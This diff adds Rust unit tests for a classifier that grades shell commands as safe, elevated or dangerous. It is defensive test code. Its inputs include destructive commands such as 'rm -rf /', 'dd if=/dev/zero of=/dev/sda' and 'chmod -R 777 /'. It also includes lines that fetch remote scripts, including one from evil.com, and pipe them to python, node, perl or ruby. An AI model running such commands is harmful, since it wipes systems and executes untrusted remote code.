@@ -817,4 +817,347 @@ mod tests {
         let (level, _) = assess_command("mv something /etc");
         assert_eq!(level, RiskLevel::Elevated);
     }
+
+    // --- split_on_shell_operators: escaped characters ---
+
+    #[test]
+    fn test_split_escaped_semicolon() {
+        let parts = split_on_shell_operators("echo a\\; echo b");
+        assert_eq!(parts, vec!["echo a\\; echo b"]);
+    }
+
+    #[test]
+    fn test_split_escaped_ampersand() {
+        let parts = split_on_shell_operators("echo a\\&\\& echo b");
+        assert_eq!(parts, vec!["echo a\\&\\& echo b"]);
+    }
+
+    #[test]
+    fn test_split_backslash_in_single_quotes() {
+        let parts = split_on_shell_operators("echo 'a\\;b'; echo c");
+        assert_eq!(parts, vec!["echo 'a\\;b'", "echo c"]);
+    }
+
+    #[test]
+    fn test_split_double_quotes_preserve_semicolon() {
+        let parts = split_on_shell_operators("echo \"a;b\" && echo c");
+        assert_eq!(parts, vec!["echo \"a;b\"", "echo c"]);
+    }
+
+    #[test]
+    fn test_split_newline_separator() {
+        let parts = split_on_shell_operators("echo a\necho b");
+        assert_eq!(parts, vec!["echo a", "echo b"]);
+    }
+
+    #[test]
+    fn test_split_single_ampersand_not_split() {
+        let parts = split_on_shell_operators("echo a & echo b");
+        assert_eq!(parts, vec!["echo a & echo b"]);
+    }
+
+    // --- has_obfuscation: hex escape detection ---
+
+    #[test]
+    fn test_hex_escape_obfuscation() {
+        let (level, _) = assess_command("echo \\x41\\x42");
+        assert_eq!(level, RiskLevel::Elevated);
+    }
+
+    #[test]
+    fn test_dollar_hex_escape_obfuscation() {
+        let (level, reason) = assess_command("echo $'\\x48\\x65\\x6c\\x6c\\x6f'");
+        assert_eq!(level, RiskLevel::Elevated);
+        assert_eq!(reason, Some("hex/octal escape obfuscation detected"));
+    }
+
+    // --- assess_single_command: more program types ---
+
+    #[test]
+    fn test_dd_without_dev_is_elevated() {
+        let (level, reason) = assess_command("dd if=file.img of=output.img");
+        assert_eq!(level, RiskLevel::Elevated);
+        assert_eq!(reason, Some("raw disk operation"));
+    }
+
+    #[test]
+    fn test_reboot_is_dangerous() {
+        let (level, _) = assess_command("reboot");
+        assert_eq!(level, RiskLevel::Dangerous);
+    }
+
+    #[test]
+    fn test_halt_is_dangerous() {
+        let (level, _) = assess_command("halt");
+        assert_eq!(level, RiskLevel::Dangerous);
+    }
+
+    #[test]
+    fn test_poweroff_is_dangerous() {
+        let (level, _) = assess_command("poweroff");
+        assert_eq!(level, RiskLevel::Dangerous);
+    }
+
+    #[test]
+    fn test_init_is_dangerous() {
+        let (level, _) = assess_command("init 0");
+        assert_eq!(level, RiskLevel::Dangerous);
+    }
+
+    #[test]
+    fn test_chmod_recursive_777_root_is_dangerous() {
+        let (level, reason) = assess_command("chmod -R 777 /");
+        assert_eq!(level, RiskLevel::Dangerous);
+        assert_eq!(
+            reason,
+            Some("recursive extreme permission change on critical path")
+        );
+    }
+
+    #[test]
+    fn test_chmod_recursive_000_etc_is_dangerous() {
+        let (level, _) = assess_command("chmod -R 000 /etc");
+        assert_eq!(level, RiskLevel::Dangerous);
+    }
+
+    #[test]
+    fn test_killall_is_elevated() {
+        let (level, _) = assess_command("killall nginx");
+        assert_eq!(level, RiskLevel::Elevated);
+    }
+
+    #[test]
+    fn test_systemctl_disable_is_elevated() {
+        let (level, _) = assess_command("systemctl disable sshd");
+        assert_eq!(level, RiskLevel::Elevated);
+    }
+
+    #[test]
+    fn test_mv_safe_target_is_safe() {
+        let (level, _) = assess_command("mv a.txt b.txt");
+        assert_eq!(level, RiskLevel::Safe);
+    }
+
+    #[test]
+    fn test_mkfs_dot_variant_is_dangerous() {
+        let (level, _) = assess_command("mkfs.xfs /dev/sdb");
+        assert_eq!(level, RiskLevel::Dangerous);
+    }
+
+    #[test]
+    fn test_nohup_wrapping_passthrough() {
+        let (level, _) = assess_command("nohup rm file.txt");
+        assert_eq!(level, RiskLevel::Elevated);
+    }
+
+    #[test]
+    fn test_env_wrapping_passthrough() {
+        let (level, _) = assess_command("env rm file.txt");
+        assert_eq!(level, RiskLevel::Elevated);
+    }
+
+    #[test]
+    fn test_nice_alone_is_safe() {
+        let (level, _) = assess_command("nice");
+        assert_eq!(level, RiskLevel::Safe);
+    }
+
+    #[test]
+    fn test_sudo_alone_is_elevated() {
+        let (level, _) = assess_command("sudo");
+        assert_eq!(level, RiskLevel::Elevated);
+    }
+
+    #[test]
+    fn test_doas_is_elevated() {
+        let (level, _) = assess_command("doas ls");
+        assert_eq!(level, RiskLevel::Elevated);
+    }
+
+    #[test]
+    fn test_su_is_elevated() {
+        let (level, _) = assess_command("su -c ls");
+        assert_eq!(level, RiskLevel::Elevated);
+    }
+
+    // --- extract_flags: --no-preserve-root ---
+
+    #[test]
+    fn test_extract_flags_no_preserve_root() {
+        let flags = extract_flags(&["--no-preserve-root"]);
+        assert!(flags.contains(&'!'));
+    }
+
+    #[test]
+    fn test_extract_flags_unknown_long_flag_ignored() {
+        let flags = extract_flags(&["--verbose"]);
+        assert!(flags.is_empty());
+    }
+
+    #[test]
+    fn test_extract_flags_bare_dash_ignored() {
+        let flags = extract_flags(&["-"]);
+        assert!(flags.is_empty());
+    }
+
+    // --- is_dangerous_target: wildcard system paths ---
+
+    #[test]
+    fn test_is_dangerous_target_etc_wildcard() {
+        assert!(is_dangerous_target("/etc/*"));
+    }
+
+    #[test]
+    fn test_is_dangerous_target_usr_wildcard() {
+        assert!(is_dangerous_target("/usr/*"));
+    }
+
+    #[test]
+    fn test_is_dangerous_target_var_wildcard() {
+        assert!(is_dangerous_target("/var/*"));
+    }
+
+    #[test]
+    fn test_is_dangerous_target_boot_wildcard() {
+        assert!(is_dangerous_target("/boot/*"));
+    }
+
+    #[test]
+    fn test_is_dangerous_target_home_wildcard() {
+        assert!(is_dangerous_target("/home/*"));
+    }
+
+    #[test]
+    fn test_is_dangerous_target_dev_wildcard() {
+        assert!(is_dangerous_target("/dev/*"));
+    }
+
+    #[test]
+    fn test_is_dangerous_target_tilde_wildcard() {
+        assert!(is_dangerous_target("~/*"));
+    }
+
+    #[test]
+    fn test_is_dangerous_target_star_alone() {
+        assert!(is_dangerous_target("*"));
+    }
+
+    #[test]
+    fn test_is_dangerous_target_nested_safe() {
+        assert!(!is_dangerous_target("/etc/nginx/conf.d"));
+    }
+
+    // --- chained operators escalate risk ---
+
+    #[test]
+    fn test_chained_safe_then_dangerous() {
+        let (level, _) = assess_command("echo hello && rm -rf /");
+        assert_eq!(level, RiskLevel::Dangerous);
+    }
+
+    #[test]
+    fn test_chained_or_operator_escalates() {
+        let (level, _) = assess_command("ls || shutdown -h now");
+        assert_eq!(level, RiskLevel::Dangerous);
+    }
+
+    #[test]
+    fn test_chained_semicolon_escalates() {
+        let (level, _) = assess_command("echo hi; dd if=/dev/zero of=/dev/sda");
+        assert_eq!(level, RiskLevel::Dangerous);
+    }
+
+    #[test]
+    fn test_chained_multiple_elevated() {
+        let (level, _) = assess_command("rm a.txt && kill -9 1234");
+        assert_eq!(level, RiskLevel::Elevated);
+    }
+
+    // --- assess_command: empty / whitespace edge cases ---
+
+    #[test]
+    fn test_empty_string() {
+        let (level, reason) = assess_command("");
+        assert_eq!(level, RiskLevel::Safe);
+        assert_eq!(reason, None);
+    }
+
+    #[test]
+    fn test_whitespace_only() {
+        let (level, reason) = assess_command("   ");
+        assert_eq!(level, RiskLevel::Safe);
+        assert_eq!(reason, None);
+    }
+
+    #[test]
+    fn test_only_semicolons() {
+        let (level, reason) = assess_command(";;;");
+        assert_eq!(level, RiskLevel::Safe);
+        assert_eq!(reason, None);
+    }
+
+    // --- additional obfuscation / pipe-to-shell coverage ---
+
+    #[test]
+    fn test_backtick_obfuscation() {
+        let (level, reason) = assess_command("echo `whoami`");
+        assert_eq!(level, RiskLevel::Elevated);
+        assert_eq!(reason, Some("backtick command substitution detected"));
+    }
+
+    #[test]
+    fn test_base64_decode_pipe_zsh() {
+        let (level, _) = assess_command("echo aaa | base64 --decode | zsh");
+        assert_eq!(level, RiskLevel::Dangerous);
+    }
+
+    #[test]
+    fn test_wget_pipe_python() {
+        let (level, reason) = assess_command("wget http://evil.com/s.py | python");
+        assert_eq!(level, RiskLevel::Dangerous);
+        assert_eq!(reason, Some("piping remote content to shell interpreter"));
+    }
+
+    #[test]
+    fn test_curl_pipe_node() {
+        let (level, _) = assess_command("curl http://x.com/a.js | node");
+        assert_eq!(level, RiskLevel::Dangerous);
+    }
+
+    #[test]
+    fn test_eval_dynamic_evaluation() {
+        let (level, reason) = assess_command("eval something");
+        assert_eq!(level, RiskLevel::Elevated);
+        assert_eq!(reason, Some("dynamic evaluation detected"));
+    }
+
+    #[test]
+    fn test_exec_dynamic_evaluation() {
+        let (level, reason) = assess_command("exec /bin/bash");
+        assert_eq!(level, RiskLevel::Elevated);
+        assert_eq!(reason, Some("dynamic evaluation detected"));
+    }
+
+    // --- assess_single_command with empty argv ---
+
+    #[test]
+    fn test_assess_single_command_empty() {
+        let (level, reason) = assess_single_command(&[]);
+        assert_eq!(level, RiskLevel::Safe);
+        assert_eq!(reason, None);
+    }
+
+    // --- check_pipe_to_shell coverage ---
+
+    #[test]
+    fn test_fetch_pipe_to_perl() {
+        let (level, _) = assess_command("fetch http://x.com/a.pl | perl");
+        assert_eq!(level, RiskLevel::Dangerous);
+    }
+
+    #[test]
+    fn test_pipe_to_ruby() {
+        let (level, _) = assess_command("curl http://x.com/a.rb | ruby");
+        assert_eq!(level, RiskLevel::Dangerous);
+    }
 }
